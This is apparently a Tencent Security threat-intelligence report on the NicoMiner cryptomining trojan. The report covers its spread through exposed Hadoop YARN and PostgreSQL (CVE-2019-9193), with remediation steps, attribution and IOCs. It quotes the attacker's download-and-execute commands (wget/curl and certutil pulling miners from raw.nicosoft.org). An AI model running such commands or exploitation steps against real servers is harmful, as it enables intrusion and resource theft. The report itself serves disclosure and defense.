> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qDbk0C1wrUprU8t_BmkgYQ)

**![](https://mmbiz.qpic.cn/mmbiz_jpg/6AoQM3RKCWWWQuk39ugBX87ogScfUETgvCVgtdGOpmQK60FINuaR3v1yyicxAK1GGrvFWrGqxm5Fm6ZBXawrVhw/640?wx_fmt=jpeg)  
**

**长按二维码关注**

**腾讯安全威胁情报中心**

  

  

**摘要**

*   NicoMiner 利用三个漏洞入侵传播：  
    Hadoop Yarn 未授权访问漏洞  
    PostgreSQL 未授权漏洞  
    PostgreSQL 提权代码执行漏洞（CVE-2019-9193）；  
    
*   利用漏洞入侵成功后会针对 Windows、Linux 系统分别投放门罗币矿机；  
    
*   感染量增长较快，一个月内翻倍，受害服务器约 3000 台；  
    
*   针对 Windows、Linux 两个平台的挖矿木马使用相同的钱包；  
    
*   关联分析发现疑似作者 ID：Nico Jiang；  
    
*   通过腾讯安图查询历史情报，发现作者疑似从事刷量相关的黑产记录。
    

  

  

**一、概述**

腾讯安全威胁情报中心捕获一起快速增长的挖矿木马 NicoMiner，该木马通过 Hadoop Yarn 未授权访问漏洞、PostgreSQL 未授权及提权代码执行漏洞（CVE-2019-9193）进行入侵攻击，会根据操作系统不同分别植入 Windows 和 Linux 平台的门罗币挖矿木马。  
由于攻击者使用的域名和样本 PDB 信息中包含 “nico jiang” 的 ID 信息，腾讯安全威胁情报中心将该挖矿木马命名为 NicoMiner。根据该挖矿木马使用的钱包算力推算，该木马在近一个月内感染量已翻倍，估计受害服务器已达 3000 台左右。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJic2PxmuYwJzzrXqBsLLpzr6KvbTuvNsyqB4R7xAnw9YrpMoIvG2cv3w/640?wx_fmt=png)

进一步溯源分析还发现，“nico jiang” 在较早时候已从事黑灰产业，该 ID 陆续注册了与游戏推广、刷量黑灰产有关的域名，近期启用之前留置的相关网络资源从事挖矿黑产。也不排除近期可能有其他黑客掌控 “nico jiang” 曾经注册的相关域名和开发设备，用来制作、传播 NicoMiner 挖矿木马。  
腾讯安全全系列产品已支持对 NicoMiner 挖矿木马攻击传播的各个环节进行检测防御：

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJd1dibNRSQF6Ro6FCx751B8iba7Xq6qlrx5GS3z28T0QianwOzoAdQxxXA/640?wx_fmt=png)  

排查和加固

由于 NicoMiner 挖矿木马的攻击呈现明显增长趋势，腾讯安全专家建议企业客户参考以下步骤对系统进行排查和加固：  
**1. 删除进程和文件：**  
**文件：**  
/*/pgsql-*/data/java.*  
/*/pgsql/data/java.*  
/*/postgres/*/data/LinuxTF  
/tmp/java  
**Windows 系统**  
c:\postgresql\*\data\conhost.exe  
c:\postgresql\*\data\sqltools.exe  
c:\windows\temp\st.exe  
c:\program files\postgresql\data\pg*\sqltools.exe  
**检查 CPU 占用高的进程：**  
java  
LinuxTF  
conhost.exe  
sqltools.exe  
**2. 加固系统：**  
**Hadoop**  
1) 如果 Hadoop 环境仅对内网提供服务，请不要将其服务开放到外网可访问。  
2) 如果必须开启公网访问，Hadoop 在 2.X 以上版本提供了安全认证功能，建议管理员升级并启用 Kerberos 的认证功能，阻止未经授权的访问。  
**PostgreSQL**  
1) 修改 PostgreSQL 的访问配置 / data/pgsql/9.3/data/pg_hba.conf，限制不受信任的对象进行访问；  
2) 谨慎考虑分配 pg_read_server_files、pg_write_server_files、pg_execute_server_program 角色权限给数据库客户。

  

  

**二、样本分析**

**漏洞入侵**

**1）Hadoop Yarn 未授权访问漏洞**  
Hadoop 是一个由 Apache 基金会所开发的分布式系统基础架构，YARN 是 hadoop 系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把 MapReduce 计算框架作为一个应用程序运行在 YARN 系统之上，通过 YARN 来管理资源。客户可以向 YARN 提交特定应用程序进行执行，其中就允许执行相关包含系统命令。  
YARN 提供有默认开放在 8088 和 8090 的 REST API（默认前者）允许客户直接通过 API 进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API 将会开放在公网导致未授权访问的问题，攻击者可以在未授权的情况下远程执行代码。  
攻击者通过扫描暴露在公网的的 8088 端口，发现没有开启特定客户安全认证的集群，并通过 YARN RESET API 提交应用，提交任务的客户名为 dr.who。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJWhA8HhOALEO6PnJXXDVrwOPBicy8WxHF4g2QAt7UAxiceSe59Ktqp6cw/640?wx_fmt=png)

攻击者在创建的 Hadoop 应用中通过 Post hxxp://ip:8088/ws/v1/cluster/apps 执行恶意命令为：  

```
wget hxxp://raw.nicosoft.org/java && chmod  x java && ./java || curl -O hxxp://raw.nicosoft.org/java && chmod  x java && ./java
```

  
该命令从黑客控制的服务器上下载挖矿木马 java 并启动。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJpEEaGuavTOicL8FkzDAZicnuCPzSetjkb7tVwWFgoAxBRBhsAlwCqISA/640?wx_fmt=png)

**2）PostgreSQL 未授权访问漏洞**  
PostgreSQL 未授权访问漏洞主要是由于管理员配置不当形成的。PostgreSQL 配置文件在 / data/pgsql/9.3/data/pg_hba.conf，如果管理员没有正确的配置信任的主机，（如下图），则会导致任意客户无需密码均可访问 PostgreSQL 数据库。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJL1SjFqQhM0bMYyCzb0iax2wmX8yhwM4gonFuvrshppPh7tkWCadLRBw/640?wx_fmt=png)

**3）PostgreSQL 提权代码执行漏洞（CVE-2019-9193）**  
2019 年 3 月安全研究人员披露了 PostgreSQL 提权代码执行漏洞（CVE-2019-9193）的漏洞细节，具有数据库服务端文件读权限的攻击者利用此漏洞，可执行任意系统命令。  
此次披露的漏洞存在于导入导出数据的命令 “COPY TO/FROM PROGRAM”” 中，“pg_read_server_files”组内客户执行上述命令后，可获取数据库超级客户权限，从而执行任意系统命令。该漏洞几乎影响了 PostgreSQL 的所有版本（从 9.3 到最新版本），同时也影响了所有的操作系统：Windows，Linux 和 Mac。  

受影响 PostgreSQL 版本：PostgreSQL >=9.3  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJQHfz6BYMDyVNSbSShhdtqxvicibicP3Sdicfllhkib21dXXM7p1Yibf7GVXA/640?wx_fmt=png)

攻击者通过批量扫描 5432 端口发现 PostgreSQL 服务器，然后利用未授权访问漏洞获得了 PostgreSQL 数据库的访问权限，接着再利用 PostgreSQL 提权代码执行漏洞（CVE-2019-9193）根据不同的系统执行以下恶意命令：  
针对 Linux 系统：  

```
sh -c curl -O hxxp://raw.nicosoft.org/java && chmod +x java && ./java
```

  
针对 Windows 系统：  

```
certutil -urlcache -split -f hxxp://raw.nicosoft.org/conhost.exe conhost.exe&start conhost.exe
```

**挖矿**

入侵 Linux 系统下载的挖矿木马 java：  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJlpuOk8OojBSaf8oXr2obFwuCOAN8ajdAd1e5OLZMxLwWsE05FLPsWA/640?wx_fmt=png)

入侵 Windows 系统后下载的 dowanload 木马 conhost.exe，负责继续下载和启动挖矿木马 SqlTools.exe  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJjb7XzBBRjFIQmm6pB9MH81SSb6ocp4tqOn6Ip9If4MxjBBvA8LhGug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJGLlnQQJbePNLRibSxQPM8Jfc8neLXzc9FDfQwibCNFW9rMHjw9hs0XGA/640?wx_fmt=png)

挖矿木马 SqlTools.exe  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJJicy71uTzDvjQs7RoYa70rC7ySLjIMhiab1oYdBcTiariakibib79Jb5Kq1A/640?wx_fmt=png)

挖矿使用矿池：xmr.f2pool.com  
两种系统下的挖矿木马使用同一个钱包：  

42Pv7VF4etz1dDPkjRWDEec2FVoFzSPDYKCsjNXDdusaTShBZZn6nr8GyNsqu8ekjSU17jmu7h6SfLg1Lr3rrJnHVokCbso  
钱包收益：7 个 XMR

过去一个月钱包算力翻番，从 150kH/s 左右涨到了 300kH/s，这也意味着感染的机器翻了一倍，估算在 3000 台左右。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJic2PxmuYwJzzrXqBsLLpzr6KvbTuvNsyqB4R7xAnw9YrpMoIvG2cv3w/640?wx_fmt=png)

  

  

**三、关联分析  
**

分析样本发现，dowanload 木马 conhost.exe 中保留了文件的 PDB 信息，其中 “Nico Jiang” 疑似木马作者的 ID 号。  

```
C:\Users\Nico Jiang\source\repos\NicoSoft\x64\Release\conhost.pdb
```

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJdLmb2O1yW6sEuH7o8uQjmPm2NaSu0CsXraE9U72kzNcKex3mXBrdfg/640?wx_fmt=png)

通过腾讯安图高级威胁溯源系统查询木马下载使用的域名 “raw.nicosoft.org”，同样发现了注册者的名字为 “Nico Jiang”，推测该 ID 号是攻击者的可能性较高。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJ26z3WATBFLiapvHKOz5B3cAGnOcXLbGerib86zMSvx8RMXIV47ia22TGw/640?wx_fmt=png)

通过搜索引擎搜索，发现域名注册的 QQ 邮箱对应 QQ 号所有者，在某个论坛接一些批量登录工具的开发需求。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJevBYdWXRzFnEPC1Lq9oChEWCLKb92Alvn2CDcRJoYFAbo6XpvzqiarQ/640?wx_fmt=png)

该 ID 注册的另一个域名 ns-game.top  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJJibLQXJWWV22Unr3gbickTMOr7a4knD30icZv9GZcdjhQtzJJPYAWJWrQ/640?wx_fmt=png)

通过该域名注册使用的 outlook 邮箱, 查询到在 github 提交的项目，属于相关平台的辅助管理插件：  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJ7EMpa9icyUaicc7KAwCeDOJ67byyNsHr7vP0rKntvRria322fCPI73mxg/640?wx_fmt=png)

**结论**

从对 ID “nico jiang” 搜索到的信息来看，可以判断该 ID 对应的人员是一位软件开发人员，曾经从事一些网站、游戏或知名应用的批量登陆工具，刷量工具的开发，具有一定的灰产属性，而相关记录大都在 2016 年。  
可疑的地方是，注册人显示为”nico jiang” 的域名 raw.nicosoft.org、ns-game.top 的注册时间分别在 2017 年和 2018 年，而 PDB 信息包含”nico jiang” 的木马样本 conhost.exe 编译日期是 2021 年 3 月 21 日（更早的样本也只再 2021 年 2 月开始出现），两者相隔较远。  
推测可能有两种结论，第一种是”nico jiang” 在从事灰产的时候注册了相关域名，并在发现了挖矿具有很大的获利空间之后，转向了制作挖矿木马的黑产，并且使用了之前注册的相关域名来提供下载服务。  
第二种是有其他黑产获得了”nico jiang” 的域名，以及”nico jiang” 所使用过的电脑（PDB 路径中的客户名通常是开发机器的客户名）的控制权，并且利用这些资源来开发和传播挖矿木马。根据已有的线索来看，属于第一种情况的可能性较大，腾讯安全威胁情报中心会将相关线索提交给有关部门，以对不法分子进行身份确认和追踪。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJWMviat6kyqSvWZiaQibu2gnth03g1gb2pwXZCMSibhKtp0NJEYHnS4iaUOA/640?wx_fmt=png)

  

  

**三、威胁视角看攻击行为  
**

| 

**ATT&CK** **阶段**

 | 

**行为**

 |
| 

**侦察**

 | 

扫描 IP 端口，确认可攻击目标存在的 Web 服务：Hadoop Yarn, PostgreSQL 等。

 |
| 

**资源开发**

 | 

注册 C2 服务器，制作 downlaoder 木马，挖矿木马

 |
| 

**初始访问**

 | 

利用对外开放的 Hadoop Yarn, PostgreSQL 服务漏洞，植入恶意 Payload 执行恶意命令进而入侵系统

 |
| 

**执行**

 | 

首先植入恶意脚本执行恶意命令，随后下载挖矿木马

 |
| 

**防御规避**

 | 

木马文件加壳保护，将文件命名伪装为系统文件

 |
| 

**影响**

 | 

门罗币矿机不间断的工作，会导致系统 CPU 负载过大，大量消耗主机 CPU 资源，严重影响主机正常服务运行，导致主机有系统崩溃风险。

 |

订阅腾讯安全威胁情报产品，赋能全网安全设备  

该团伙相关的威胁数据已加入腾讯安全威胁情报，可赋能给腾讯全系列安全产品，推荐政企客户通过订阅腾讯安全威胁情报产品，让全网安全设备同步具备相应的威胁检测、防御能力。

公有云的安全防护

推荐政企客户在公有云中部署腾讯云防火墙、腾讯主机安全（云镜）等产品检测防御相关威胁。  
**腾讯云防火****墙（云镜）**已支持拦截利用 PostgreSQL 提权代码执行漏洞（CVE-2019-9193）发起的恶意攻击行为。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJsIicUjuGOw1eiaLXEpSmhDvvJkMkicmhcvLZ85dre8Ek1Fb4Vd5DwPBvw/640?wx_fmt=png)

**腾讯主机安全**可对病毒攻击过程中产生得木马落地文件进行自动检测，客户可后台一键隔离，删除。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJvDzoTRM7mbsyvazibsDkZSCOsN668QmOEIprCDEe9A8P7LiaGc01gG6Q/640?wx_fmt=png)

私有云的安全防护  

私有云客户可通过腾讯 T-Sec 高级威胁检测系统进行流量检测分析，及时发现黑客团伙的攻击活动。**腾讯 **T-Sec** 高级威胁检测系统（御界）**可检测到利用 PostgreSQL 提权代码执行漏洞（CVE-2019-9193）发起的恶意攻击行为。  

![](https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJtv71abelS7OKwsxpZy5tsUjdHQ8ubjNSy3ib3csMsCf0RiardKLsiaGLg/640?wx_fmt=png)

NicoMiner 挖矿木马会危害 Linux、Windows 双平台系统，推荐企业私有云客户在每台终端、服务器部署**腾讯 T-Sec 零信任无边界访问控制系统（iOA）**，腾讯 iOA 集成病毒防护和漏洞修复能力可防御病毒木马对终端和服务器的破坏活动。腾讯 iOA 通过验证客户身份、设备及应用安全状态确定是否允许客户访问企业业务，确保对企业公有云、私有云以及本地业务的可信访问。无论员工位于何处、使用何设备，都可安全访问企业资源和数据。  

![](https://mmbiz.qpic.cn/mmbiz/6AoQM3RKCWXIHeBZ6zsgXX0hib3CpzmuJmt2aaERWqcaW1yWIPKLpsj0VEZAnJpt0tHkYOE4rtGmibicdemaAwBqQ/640?wx_fmt=bmp)  

腾讯安全响应清单

腾讯安全系列产品针对 NicoMiner 挖矿木马攻击的具体响应清单如下：  

| 

**应用场景**

 | 

**安全产品**

 | 

**解决方案**

 |
| 

**威**

**胁**

**情**

**报**

 | 

腾讯 T-Sec

威胁情报云查服务

（SaaS）

 | 

1）威胁情报已加入，可赋能全网安全设备。

各类安全产品可通过 “威胁情报云查服务” 提供的接口提升威胁识别能力。可参考:https://cloud.tencent.com/product/tics

 |
| 

腾讯 T-Sec

网络空间风险云监测系统

（CCMS）

 | 

1）NicoMiner 相关情报已加入。

腾讯安全云监测系统，面向行业客户的监管方和被监管方，结合漏洞扫描、涉敏内容检测、全网威胁情报发现能力等，为客户提供全面、及时的互联网风险监测评估服务，并可提供配套安全管家服务，可对相关风险提供有效的响应处理。

 |
| 

腾讯 T-Sec

高级威胁追溯系统

 | 

1）NicoMiner 相关情报已支持检索，可自动关联分析到该病毒家族最新变种，使用资产。

网管可通过威胁追溯系统，分析日志，进行线索研判、追溯网络入侵源头。腾讯 T-Sec 高级威胁追溯系统的更多信息，可参考：https://cloud.tencent.com/product/atts

 |
| 

**云原生安全**

**防护**

 | 

云防火墙

（Cloud  Firewall，CFW）

 | 

基于网络流量进行威胁检测与主动拦截，阻断恶意攻击流量，阻断恶意通信流量：

1）NicoMiner 相关联的 IOCs 已支持识别检测；  

2）已支持检测以下漏洞利用攻击：

Hadoop 未授权访问漏洞、Postgres 提权代码执行漏洞 CVE-2019-9193

有关云防火墙的更多信息，可参考：  
https://cloud.tencent.com/product/cfw

 |
| 

腾讯 T-Sec  主机安全

（Cloud Workload Protection，CWP）

 | 

1）云镜已支持 NicoMiner 关联模块的检测告警，查杀清理。

2）已支持检测主机存在的以下相关漏洞：

Hadoop 未授权访问漏洞、Postgres 未授权访问漏洞

腾讯主机安全（云镜）提供云上终端的防毒杀毒、防入侵、漏洞管理、基线管理等。关于 T-Sec 主机安全的更多信息，可参考：https://cloud.tencent.com/product/cwp

 |
| 

腾讯 T-Sec 安全运营中心

（SOC）

 | 

基于客户云端安全数据和腾讯安全大数据的云安全运营平台。已接入腾讯主机安全（云镜）、腾讯御知等产品数据导入，为客户提供漏洞情报、威胁发现、事件处置、基线合规、及泄漏监测、风险可视等能力。

关于腾讯 T-Sec 安全运营中心的更多信息，可参考：https://s.tencent.com/product/soc/index.html

 |
| 

**非云企业安全防护**

 | 

腾讯 T-Sec

高级威胁检测系统

（腾讯御界）

 | 

基于网络流量进行威胁检测，已支持：

1）NicoMiner 相关联的 IOCs 已支持识别检测；

2）已支持检测以下漏洞利用攻击：

Hadoop 未授权访问漏洞、Postgres 提权代码执行漏洞 CVE-2019-9193

关于 T-Sec 高级威胁检测系统的更多信息，可参考：

https://cloud.tencent.com/product/nta

 |
| 

腾讯 T-Sec

零信任无边界

访问控制系统

 （iOA）

 | 

1）已支持 NicoMiner 关联模块的检测告警，查杀清理。

零信任无边界访问控制系统（iOA）是腾讯结合自身丰富的网络安全管理实践经验与 “零信任” 理念，推出的网络边界访问管控整体解决方案。更多资料，可参考：https://s.tencent.com/product/ioa/index.html

 |

欢迎长按识别以下二维码，添加腾讯安全小助手，咨询了解更多腾讯安全产品信息。

![](https://mmbiz.qpic.cn/mmbiz_jpg/6AoQM3RKCWVa0XQ8L6VR3e2L2eMicfVExicMml0F0WyrsHdB5eibtjaeIjZc7pFG27f5Fnxjn9dfTDreMsPUEib6uw/640?wx_fmt=jpeg)

**IOCs**

**Domain**  
raw.nicosoft.org  
**IP**  
154.91.1.27  
**Md5**  

| 

Java

 | 

df840b3decb91ae7480b2ccf95df9f9a

 |
| 

Java

 | 

dba1ef891aed1c769014a0d3aa5ed321

 |
| 

Java

 | 

1aa6a96f4a6fcc5c4309f2406d3479ba

 |
| 

CONHOST.EXE

 | 

32b8a44ee3214ab56e1edbaa016918c7

 |
| 

CONHOST.EXE

 | 

0a31ae5882697455a071f73191ed661c

 |
| 

CONHOST.EXE

 | 

2c31a7243f00afe467e2994d3c249024

 |
| 

conhost.exe

 | 

bf825890526386dd96e82d2ce57e0303

 |
| 

SqlTools.exe

 | 

84757d6b1a94021f246d14b37c1015b8

 |
| 

task.exe

 | 

52cd60289ffe8e14c5aa6cb8ea8ad730

 |
| 

LinuxTF

 | 

f453b9c09ea2fb6a194b5d81d515b0e8

 |

  
**URL**  
hxxp://raw.nicosoft.org/SqlTools.exe  
hxxp://nicosoft.org/SqlTools.exe  
hxxp://154.91.1.27/SqlTools.exe  
hxxp://nicosoft.org/sqltools.exe  
hxxp://154.91.1.27/sqltools.exe  
hxxp://raw.nicosoft.org/java  
hxxp://raw.nicosoft.org/conhost.exe  
hxxp://154.91.1.27/task.exe  
hxxp://154.91.1.27/conhost.exe  
hxxp://154.91.1.27/WinRing0x64.sys  
hxxp://154.91.1.27/LinuxTF

**参考链接：**

_https://s.tencent.com/research/report/1206.html  
https://s.tencent.com/research/report/1175.html  
https://cloud.tencent.com/developer/article/1472565_  
[](https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247497474&idx=1&sn=87eb580380ee3ff5efd389da419f82c9&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz/QKDxrVYehicdAibIVUpquF6TQUwXFg6dYCrLBEiasLaVyObib9LjK08qQ7IzkYKROO93uxoEnMSl8zRCWiaY7JwgZWg/640?wx_fmt=jpeg)

  

**关于腾讯安全威胁情报中心**

  

腾讯安全威胁情报中心是一个涵盖全球多维数据的情报分析、威胁预警分析平台。依托顶尖安全专家团队支撑，帮助安全分析人员、安全运维人员快速、准确地对可疑威胁事件进行预警、处置和溯源分析。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/6AoQM3RKCWV7OeTgN0K43Zp1I7B3u61cRjLs0v4MHLgzDK6aOHmAAIicnQgPVOXlOGhVby4s0TyefhY0NkGOkEA/640?wx_fmt=jpeg)

**长按二维码关注**

**腾讯安全威胁情报中心**

![](https://mmbiz.qpic.cn/mmbiz_gif/6AoQM3RKCWX1eVTgJibmTERpefy9ajPmQPOib80Kf7oz4cRQPnuW52QvoqMORViapS08HpRsLhibwiaxSAJQ0gHSicLw/640?wx_fmt=gif)